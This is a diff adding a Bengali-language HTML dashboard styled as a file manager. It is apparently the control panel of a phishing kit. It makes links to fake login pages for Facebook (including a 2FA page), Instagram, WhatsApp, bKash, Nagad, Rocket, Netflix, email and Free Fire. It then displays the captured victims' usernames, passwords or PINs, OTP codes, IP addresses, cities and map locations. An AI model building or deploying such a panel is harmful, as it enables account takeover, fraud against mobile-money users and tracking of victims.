@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - HTML ফাইল ম্যানেজার</title>
+    <style>
+        :root {
+            --primary-color: #4f46e5; --primary-hover: #4338ca;
+            --danger-color: #dc2626; --danger-hover: #b91c1c;
+            --success-color: #16a34a; --success-hover: #15803d;
+            --bg-color: #f3f4f6; --widget-bg: #ffffff;
+            --text-dark: #111827; --text-muted: #6b7280;
+            --border-color: #e5e7eb;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+        body { background-color: var(--bg-color); color: var(--text-dark); }
+
+        .dashboard-container { max-width: 1200px; margin: 0 auto; padding: 15px; }
+
+        header {
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            color: white; padding: 20px; border-radius: 12px;
+            margin-bottom: 20px; text-align: center;
+        }
+        header h1 { font-size: 1.8rem; }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr; /* মোবাইল ডিফল্ট: এক কলাম */
+            gap: 20px;
+        }
+
+        .widget {
+            background: var(--widget-bg);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.07), 0 2px 4px -2px rgba(0,0,0,0.07);
+        }
+
+        .widget-title {
+            font-size: 1.1rem; font-weight: 600; margin-bottom: 20px;
+            display: flex; align-items: center; gap: 10px;
+            border-bottom: 1px solid var(--border-color); padding-bottom: 15px;
+        }
+
+        /* File Cube Styles */
+        .file-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); /* মোবাইলের জন্য ছোট কিউব */
+            gap: 15px;
+        }
+
+        .file-cube {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background-color: #f9fafb; border-radius: 10px; padding: 10px;
+            aspect-ratio: 1 / 1; cursor: pointer; transition: all 0.2s ease;
+            border: 2px solid var(--border-color); text-align: center;
+        }
+
+        .file-cube:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
+        .file-cube.active { border-color: var(--primary-color); background-color: #eef2ff; }
+
+        .cube-icon { width: 35px; height: 35px; margin-bottom: 8px; object-fit: contain; }
+        .cube-name { font-size: 0.75rem; font-weight: 500; color: var(--text-dark); }
+
+        /* Link & Actions */
+        .link-display {
+            background: #eef2ff; border: 1px dashed var(--primary-color);
+            color: var(--primary-color); padding: 12px; border-radius: 8px;
+            margin-bottom: 15px; word-break: break-all; font-family: monospace;
+            font-size: 0.8rem; min-height: 52px; display: flex; align-items: center; justify-content: center;
+        }
+        .btn-group { display: flex; gap: 10px; }
+        .btn { border: none; padding: 10px 15px; border-radius: 6px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; text-decoration: none; text-align: center; flex-grow: 1; }
+        .btn-primary { background-color: var(--primary-color); color: white; }
+        .btn-primary:hover { background-color: var(--primary-hover); }
+        .btn-secondary { background-color: #e5e7eb; color: var(--text-dark); }
+        .btn-secondary:hover { background-color: #d1d5db; }
+
+        .actions-container { display: flex; flex-direction: column; gap: 15px; }
+        .auto-refresh { display: flex; align-items: center; justify-content: space-between; padding: 10px; background-color: #f9fafb; border-radius: 8px; }
+        .btn-success { background-color: var(--success-color); color: white; }
+        .btn-success:hover { background-color: var(--success-hover); }
+        .btn-danger { background-color: var(--danger-color); color: white; }
+        .btn-danger:hover { background-color: var(--danger-hover); }
+        .btn-icon { display: flex; align-items: center; justify-content: center; gap: 8px; }
+
+        /* Data Viewer */
+        .data-content {
+            padding: 0;
+            max-height: 400px;
+            overflow-y: auto;
+            overflow-x: auto; /* মোবাইলের জন্য টেবিল স্ক্রল */
+        }
+
+        .data-table { width: 100%; border-collapse: collapse; }
+        .data-table th, .data-table td { white-space: nowrap; } /* কনটেন্ট যেন র‍্যাপ না হয় */
+        .data-table th { background: #f9fafb; padding: 10px; text-align: left; font-weight: 600; font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; }
+        .data-table td { padding: 10px; border-bottom: 1px solid var(--border-color); font-size: 0.8rem; vertical-align: middle; }
+        .data-table tr:last-child td { border-bottom: none; }
+        .data-table tr:hover { background: #f9fafb; }
+
+        .empty-data { color: var(--text-muted); font-style: italic; text-align: center; padding: 20px; }
+        .view-details-btn { background-color: #3b82f6; color: white; padding: 4px 10px; font-size: 0.75rem; border-radius: 4px; border: none; cursor: pointer; }
+        .sensitive-data { background: #fee2e2; color: #991b1b; padding: 2px 6px; border-radius: 4px; font-weight: 500; font-size: 0.75rem; }
+
+        /* Modals */
+        .overlay { display: none; position: fixed; inset: 0; background: rgba(17, 24, 39, 0.6); backdrop-filter: blur(4px); z-index: 999; }
+        .details-panel, .delete-confirm-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border-radius: 10px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 8px 10px -6px rgba(0,0,0,0.1); z-index: 1000; width: 90%; }
+        .details-panel { max-width: 600px; max-height: 80vh; }
+        .details-header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid var(--border-color); }
+        .details-title { font-size: 1.1rem; font-weight: 600; }
+        .close-btn { background: #fef2f2; color: #dc2626; border: none; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 1rem; }
+        .details-content { padding: 15px; max-height: calc(80vh - 60px); overflow-y: auto; }
+        .details-row { display: grid; grid-template-columns: 100px 1fr; gap: 5px; margin-bottom: 8px; padding: 8px; background: #f9fafb; border-radius: 5px; align-items: start; }
+        .details-label { font-weight: 600; color: #4b5563; font-size: 0.8rem; }
+        .details-value { color: var(--text-dark); word-break: break-all; }
+
+        .delete-confirm-modal { max-width: 400px; padding: 25px; text-align: center; }
+        .delete-confirm-modal h3 { color: var(--danger-color); margin-bottom: 15px; font-size: 1.25rem; }
+        .delete-confirm-modal p { margin-bottom: 25px; color: var(--text-muted); }
+        .modal-buttons { display: flex; justify-content: center; gap: 15px; }
+
+        .switch { position: relative; display: inline-block; width: 45px; height: 22px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; inset: 0; background-color: #ccc; transition: .4s; border-radius: 22px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--success-color); }
+        input:checked + .slider:before { transform: translateX(23px); }
+
+        /* =========== রেসপন্সিভ স্টাইল (বড় স্ক্রিনের জন্য) =========== */
+        @media (min-width: 1024px) {
+            .dashboard-grid {
+                grid-template-columns: repeat(12, 1fr);
+            }
+            .file-selector { grid-column: span 12; }
+            .link-generator { grid-column: span 5; }
+            .data-actions-widget { grid-column: span 7; }
+            .data-viewer { grid-column: span 12; }
+            .file-grid { grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); }
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard-container">
+        <header>
+            <h1>HTML ফাইল ম্যানেজার ড্যাশবোর্ড</h1>
+        </header>
+
+        <main class="dashboard-grid">
+            <section class="widget file-selector">
+                <h2 class="widget-title">ফাইল সিলেক্ট করুন</h2>
+                <div class="file-grid" id="fileGrid"></div>
+            </section>
+
+            <section class="widget link-generator">
+                <h2 class="widget-title">লিঙ্ক জেনারেটর</h2>
+                <div class="link-display" id="linkDisplay">কোন ফাইল নির্বাচন করা হয়নি</div>
+                <div class="btn-group">
+                    <button class="btn btn-primary" onclick="generateLink()">লিঙ্ক তৈরি</button>
+                    <a href="#" class="btn btn-secondary" id="visitLinkBtn" target="_blank" style="display: none;">ভিজিট</a>
+                </div>
+            </section>
+
+            <section class="widget data-actions-widget">
+                <h2 class="widget-title">কন্ট্রোল প্যানেল</h2>
+                <div class="actions-container">
+                     <div class="auto-refresh">
+                        <span>অটো রিফ্রেশ</span>
+                        <label class="switch"><input type="checkbox" id="autoRefreshToggle" onchange="toggleAutoRefresh()"><span class="slider"></span></label>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn btn-success btn-icon" onclick="loadInputData()">রিফ্রেশ</button>
+                        <button class="btn btn-danger btn-icon" onclick="showDeleteConfirm()">সব ডিলিট</button>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="widget data-viewer">
+                <h2 class="widget-title">ইনপুট ডেটা</h2>
+                <div class="data-grid-view" id="dataGrid">
+                    <div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="details-panel" id="detailsPanel">
+        <div class="details-header">
+            <div class="details-title" id="detailsTitle">ডিটেলস ভিউ</div>
+            <button class="close-btn" onclick="closeDetails()">✕</button>
+        </div>
+        <div class="details-content" id="detailsContent"></div>
+    </div>
+
+    <div class="overlay" id="deleteOverlay" style="display: none;"></div>
+    <div class="delete-confirm-modal" id="deleteConfirmModal">
+        <h3>⚠️ সব ডেটা ডিলিট করুন</h3>
+        <p>আপনি কি নিশ্চিত যে আপনি সব ডেটা সম্পূর্ণ ডিলিট করতে চান?</p>
+        <div class="modal-buttons">
+            <button class="btn btn-danger" onclick="deleteAllData()">হ্যাঁ, ডিলিট করুন</button>
+            <button class="btn btn-secondary" onclick="hideDeleteConfirm()">বাতিল করুন</button>
+        </div>
+    </div>
+
+    <script>
+        const files = [
+            { name: "facebook-2FA.html", size: "8.2 KB", url: "facebook-2FA.html", dataKey: "facebookData" }, { name: "Facebook Lite.html", size: "7.5 KB", url: "Facebook Lite.html", dataKey: "facebookLiteData" },
+            { name: "Instagram.html", size: "9.1 KB", url: "Instagram.html", dataKey: "instagramData" }, { name: "Twitter.html", size: "10.3 KB", url: "Twitter.html", dataKey: "twitterData" },
+            { name: "TikTok.html", size: "8.9 KB", url: "TikTok.html", dataKey: "tiktokData" }, { name: "Snapchat.html", size: "6.7 KB", url: "Snapchat.html", dataKey: "snapchatData" },
+            { name: "WhatsApp.html", size: "7.1 KB", url: "WhatsApp.html", dataKey: "whatsappData" }, { name: "Imo.html", size: "9.2 KB", url: "Imo.html", dataKey: "imoData" },
+            { name: "bKash.html", size: "12.5 KB", url: "bKash.html", dataKey: "bkashData" }, { name: "Nagad.html", size: "11.8 KB", url: "Nagad.html", dataKey: "nagadData" },
+            { name: "Rocket.html", size: "11.2 KB", url: "Rocket.html", dataKey: "rocketData" }, { name: "Netflix.html", size: "15.7 KB", url: "Netflix.html", dataKey: "netflixData" },
+            { name: "Email.html", size: "5.5 KB", url: "Email.html", dataKey: "emailData" }, { name: "Free-fire.html", size: "14.2 KB", url: "Free-fire.html", dataKey: "freefireData" }
+        ];
+
+        let selectedFile = null;
+        let autoRefreshInterval = null;
+
+        // আইকন ম্যাপ (সঠিক করা হয়েছে)
+        const iconMap = {
+            facebookData: 'Logo/Facebook.png',
+            facebookLiteData: 'Logo/Facebook.png',
+            instagramData: 'Logo/instagram.png',
+            twitterData: 'Logo/Twitter.png',
+            tiktokData: 'Logo/logo.png',
+            snapchatData: 'Logo/Snapchat-logo.png',
+            whatsappData: 'Logo/whatsapp-logo.png',
+            imoData: 'Logo/imo.png',
+            bkashData: 'Logo/bkash-logo.png',
+            nagadData: 'Logo/nagad-logo.png',
+            rocketData: 'Logo/rocket-logo.png',
+            netflixData: 'Logo/Netflix.png',
+            emailData: 'Logo/Gmail.png',
+            freefireData: 'Logo/Freefair.png',
+            default: 'https://www.svgrepo.com/show/532598/document-text.svg'
+        };
+        
+        function getIconForFile(dataKey) { return iconMap[dataKey] || iconMap.default; }
+
+        function renderFileGrid() {
+            const gridElement = document.getElementById('fileGrid');
+            gridElement.innerHTML = files.map(file => `
+                <div class="file-cube ${selectedFile && selectedFile.url === file.url ? 'active' : ''}" onclick='selectFile(${JSON.stringify(file)})'>
+                    <img src="${getIconForFile(file.dataKey)}" class="cube-icon" alt="${file.name} icon">
+                    <span class="cube-name">${file.name.replace('.html', '')}</span>
+                </div>`).join('');
+        }
+
+        function getStoredData() {
+            const storedData = localStorage.getItem('userInputData');
+            let data = {};
+            files.forEach(file => { data[file.dataKey] = []; });
+            return storedData ? { ...data, ...JSON.parse(storedData) } : data;
+        }
+
+        function selectFile(file) {
+            selectedFile = files.find(f => f.url === file.url);
+            renderFileGrid();
+            document.getElementById('visitLinkBtn').style.display = 'none';
+            document.getElementById('linkDisplay').textContent = 'লিঙ্ক তৈরি করতে বাটনে ক্লিক করুন';
+        }
+
+        function generateLink() {
+            if (!selectedFile) return alert(`দয়া করে একটি ফাইল নির্বাচন করুন`);
+            const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
+            const fullUrl = `${baseUrl}/${selectedFile.url}`;
+            document.getElementById('linkDisplay').textContent = fullUrl;
+            const visitBtn = document.getElementById('visitLinkBtn');
+            visitBtn.href = selectedFile.url;
+            visitBtn.style.display = 'block';
+        }
+
+        function loadInputData() {
+            const storedData = getStoredData();
+            const dataGrid = document.getElementById('dataGrid');
+            dataGrid.innerHTML = '';
+            let dataFound = false;
+
+            files.forEach(file => {
+                if (storedData[file.dataKey] && storedData[file.dataKey].length > 0) {
+                    dataFound = true;
+                    renderDataCard(dataGrid, file.name, file.dataKey, storedData[file.dataKey]);
+                }
+            });
+
+            if (!dataFound) dataGrid.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
+        }
+        
+        function renderDataCard(container, title, dataKey, data) {
+            const card = document.createElement('div');
+            card.className = 'data-card';
+
+            let tableHTML = `
+                <table class="data-table">
+                    <thead><tr><th>ইউজার</th><th>পাস/পিন</th><th>OTP/2FA</th><th>একশন</th></tr></thead>
+                    <tbody>`;
+            data.forEach((item, index) => {
+                const userIdentifier = item.email || item.phone || item.username || 'N/A';
+                const password = item.pass || 'N/A';
+                const otp = item['2fa_code'] || 'N/A';
+                tableHTML += `<tr>
+                                <td>${userIdentifier}</td>
+                                <td><span class="sensitive-data">${password}</span></td>
+                                <td><span class="sensitive-data">${otp}</span></td>
+                                <td><button class="view-details-btn" onclick="showDetails('${dataKey}', ${index})">ডিটেলস</button></td>
+                              </tr>`;
+            });
+            tableHTML += `</tbody></table>`;
+            
+            card.innerHTML = `
+                <div class="data-card-header">${title} (${data.length} টি)</div>
+                <div class="data-content">${tableHTML}</div>
+            `;
+            container.appendChild(card);
+        }
+
+        function showDetails(dataKey, index) {
+            const data = getStoredData()[dataKey][index];
+            document.getElementById('detailsTitle').textContent = `${dataKey.replace('Data', '')} ডিটেলস`;
+            let detailsHTML = '';
+            const addRow = (label, value, isSensitive = false) => {
+                if (!value && value !== false && value !== 0) return '';
+                const displayValue = isSensitive ? `<span class="sensitive-data">${value}</span>` : value;
+                return `<div class="details-row"><div class="details-label">${label}</div><div class="details-value">${displayValue}</div></div>`;
+            };
+            
+            detailsHTML += addRow('ইউজার', data.email || data.phone || data.username);
+            detailsHTML += addRow('পাসওয়ার্ড/পিন', data.pass, true);
+            detailsHTML += addRow('OTP/2FA কোড', data['2fa_code'], true);
+            detailsHTML += addRow('টাইপ', data.type);
+            detailsHTML += addRow('সময়', data.timestamp);
+            
+            if (data.deviceInfo) {
+                try {
+                    const info = JSON.parse(data.deviceInfo);
+                    detailsHTML += '<h3 style="margin: 15px 0 10px; font-weight: 600; color: #374151;">ডিভাইস ইনফর্মেশন</h3>';
+                    detailsHTML += addRow('User Agent', info.ua);
+                    detailsHTML += addRow('IP Address', info.ip);
+                    detailsHTML += addRow('দেশ', info.country);
+                    detailsHTML += addRow('শহর', info.city);
+                    detailsHTML += addRow('নেটওয়ার্ক', info.net_effective);
+                    detailsHTML += addRow('ব্যাটারি', info.batteryLevel != null ? `${info.batteryLevel}%` : 'N/A');
+                    detailsHTML += addRow('চার্জিং', info.isCharging != null ? (info.isCharging ? 'Yes' : 'No') : 'N/A');
+                    if (info.lat && info.lon) {
+                        detailsHTML += addRow('লোকেশন', `<a href="https://maps.google.com/?q=${info.lat},${info.lon}" target="_blank" style="color: var(--primary-color);">View on Map</a>`);
+                    }
+                } catch (e) { detailsHTML += addRow('Device Info', 'Error parsing data'); }
+            }
+            document.getElementById('detailsContent').innerHTML = detailsHTML;
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('detailsPanel').style.display = 'block';
+        }
+        
+        function closeDetails() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('detailsPanel').style.display = 'none';
+        }
+
+        function showDeleteConfirm() {
+            document.getElementById('deleteOverlay').style.display = 'block';
+            document.getElementById('deleteConfirmModal').style.display = 'block';
+        }
+
+        function hideDeleteConfirm() {
+            document.getElementById('deleteOverlay').style.display = 'none';
+            document.getElementById('deleteConfirmModal').style.display = 'none';
+        }
+
+        function deleteAllData() {
+            localStorage.removeItem('userInputData');
+            hideDeleteConfirm();
+            loadInputData();
+        }
+
+        function toggleAutoRefresh() {
+            if (document.getElementById('autoRefreshToggle').checked) {
+                autoRefreshInterval = setInterval(loadInputData, 5000);
+            } else {
+                clearInterval(autoRefreshInterval);
+                autoRefreshInterval = null;
+            }
+        }
+
+        window.addEventListener('load', () => {
+            renderFileGrid();
+            if (files.length > 0) selectFile(files[0]);
+            loadInputData();
+        });
+
+        document.getElementById('overlay').addEventListener('click', closeDetails);
+        document.getElementById('deleteOverlay').addEventListener('click', hideDeleteConfirm);
+    </script>
+</body>
+</html>
+
+
